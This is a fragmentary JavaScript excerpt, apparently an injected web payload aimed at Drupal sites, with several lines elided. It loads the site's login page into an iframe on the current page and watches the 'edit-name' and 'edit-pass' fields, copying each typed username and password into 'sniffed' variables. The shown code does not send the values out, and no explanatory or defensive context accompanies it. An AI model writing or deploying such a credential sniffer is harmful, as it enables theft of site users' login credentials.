...
const drupalLoginURL = drupalRoot + '/user/login';
const iframeID = 'ifr';
const cmsID = '_drup_';
let sniffedUsername = '';
let sniffedPassword = '';
...
function monitorDrupalUserInput(iframeID, endpointTitle) {
  ...
  for (i = 0; i < inputTags.length; i ++) {
    if ((inputTags[i].id == 'edit-name') && (sniffedUsername != inputTags[i].value)) {
      sniffedUsername = inputTags[i].value;
    }
    if ((inputTags[i].id == 'edit-pass') && (sniffedPassword != inputTags[i].value)) {
...
loginTitle = getEndpointTitle(drupalLoginURL);
addIframeToCurrPage(iframeID, drupalLoginURL, loginTitle);
